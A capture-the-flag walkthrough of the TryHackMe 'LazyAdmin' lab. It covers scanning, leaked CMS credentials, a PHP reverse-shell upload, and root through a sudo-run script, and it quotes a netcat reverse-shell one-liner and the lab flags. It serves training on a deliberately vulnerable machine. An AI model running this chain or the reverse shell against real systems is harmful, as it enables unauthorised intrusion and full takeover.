### Easy linux machine to practice your skills
Room: https://tryhackme.com/room/lazyadmin
##

**sudo nmap** -sS -sV -T5 -vv xx.xx.xx.xxx
```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**gobuster** dir -u http:/xx.xx.xx.xxx --wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 300
```
/content              (Status: 301) [Size: 314] [--> http://xx.xx.xx.xxx/content/]
```

On the **/content** directory seems to be installed Sweet Rice CMS.   

**gobuster** dir -u http://xx.xx.xx.xxx/content --wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 300
```
/images               (Status: 301) [Size: 321] [--> http://xx.xx.xx.xxx/content/images/]
/js                   (Status: 301) [Size: 317] [--> http://xx.xx.xx.xxx/content/js/]    
/inc                  (Status: 301) [Size: 318] [--> http://xx.xx.xx.xxx/content/inc/]   
/as                   (Status: 301) [Size: 317] [--> http://xx.xx.xx.xxx/content/as/]    
/_themes              (Status: 301) [Size: 322] [--> http://xx.xx.xx.xxx/content/_themes/]
/attachment           (Status: 301) [Size: 325] [--> http://xx.xx.xx.xxx/content/attachment/]
```

By going to http://xx.xx.xx.xxx/content/inc, we can find a directory called **mysql_backup** that happens to have a .sql file.  
Once we download and read that file, we have the following credentials  
> manager: 42f749ade7f9e195bf475f37a44cafcb

The hash is a MD5 and reveals the **Password123** password.  
With that, we're able to login on /content/as page.  

From here, we can edit pretty much any php page's code with a PHP reverse shell.  
I chose to create a 'test' ad page with a PHP reverse shell as the source code. The page was created at /content/ads/test.php  

On the listener terminal, we got a connection.  
```
listening on [any] 5555 ...
connect to [xx.x.x.xxx] from (UNKNOWN) [xx.xx.xx.xxx] 33004
Linux THM-Chal 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux
 21:06:32 up 29 min,  0 users,  load average: 0.00, 0.02, 0.14
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
```

To spawn a bash shell, we can use ```python3 -c 'import pty; pty.spawn("/bin/bash")'```

**The first flag, located on /home/itguy/user.txt, is THM{63e5bce9271952aad1113b6f1ac28a07}** **[1]**.  

From that directory we get the mysql credentials as well.  
```
cat mysql_login.txt
rice:randompass
```

Checking **sudo -l**, we see that we can run the **backup.pl** script from /home/itguy directory.  

**cat backup.pl**
```
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
```

**cat /etc/copy.sh**
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
```

It seems that it already has a reverse shell in this script. I just edited and placed my IP there.  
**sudo** /usr/bin/perl /home/itguy/backup.pl

On our second listener, we got a second shell. This time, under root privileges.  

**Second and final flag is at /root/root.txt and is THM{6637f41d0177b6f37cb20d775124699f}** **[2]**.  
